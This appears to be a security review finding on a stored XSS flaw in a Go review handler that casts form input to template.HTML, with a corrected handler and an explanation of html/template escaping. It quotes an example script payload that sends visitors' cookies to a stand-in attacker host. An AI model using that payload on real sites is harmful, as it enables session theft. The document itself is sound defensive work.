## Verdict
Confirmed. The handler takes the raw, attacker-controlled `reviewText` form value and wraps it in `template.HTML(reviewText)` before handing it to the template. `template.HTML` is a marker type that tells `html/template` "this string is already safe HTML, do not escape it." Casting untrusted input to that type strips out the contextual auto-escaping that `html/template` would otherwise apply, so a review body like `<script>document.location='https://evil.example/steal?c='+document.cookie</script>` is rendered verbatim into the page and executes in every visitor's browser who views that review (stored XSS).

## Source
`reviewText := r.FormValue("reviewText")` on line 16 - untrusted, user-supplied HTTP form data, flowing directly into the `Body` field of the template data struct and rendered into `<div class="review-body">{{.Body}}</div>`.

## Fix
```go
func postReviewHandler(w http.ResponseWriter, r *http.Request) {
	reviewText := r.FormValue("reviewText")

	data := struct {
		Body string
	}{
		Body: reviewText,
	}

	w.Header().Set("Content-Type", "text/html")
	reviewTmpl.Execute(w, data)
}
```

Change the `Body` field's type from `template.HTML` to plain `string` and assign `reviewText` directly, without wrapping it in `template.HTML(...)`. No other changes are needed - the template itself (`{{.Body}}` in an HTML element body context) is unchanged; `html/template` will now apply its normal contextual auto-escaping to the value because it sees an ordinary `string` rather than the pre-trusted `template.HTML` marker type.

If the review body is genuinely expected to contain a constrained subset of HTML (e.g. bold/italic formatting from a rich-text editor), do not restore `template.HTML`. Instead, run the raw input through an HTML sanitizer such as `github.com/microcosm-cc/bluemonday` with a restrictive policy (e.g. `bluemonday.UGCPolicy()` or a custom allowlist) before rendering, and only then wrap the sanitized output in `template.HTML`, since sanitization - not the type cast - is what makes the value trustworthy.

## Explanation
`html/template` (unlike `text/template`) auto-escapes all pipeline output according to the surrounding HTML context (element body, attribute, URL, JS, CSS, etc.), which is exactly what prevents XSS by default. The package's typed strings (`template.HTML`, `template.JS`, `template.URL`, ...) exist as an explicit escape hatch: values of these types are treated as already-safe and are inserted into the output unescaped, on the assumption that only the application developer - never request data - produces them. The vulnerable line violates that contract by manufacturing a `template.HTML` value directly from `r.FormValue`, which is attacker-controlled. That converts the auto-escaping template engine into an equivalent of directly concatenating unescaped user input into the HTML response, defeating the entire point of using `html/template`. Reverting the field to a plain `string` restores auto-escaping so that HTML metacharacters (`<`, `>`, `&`, `"`, `'`) in the review text are rendered as literal, inert text (e.g. `&lt;script&gt;`) rather than parsed as markup, closing the stored XSS vector while still displaying the customer's review content as text.
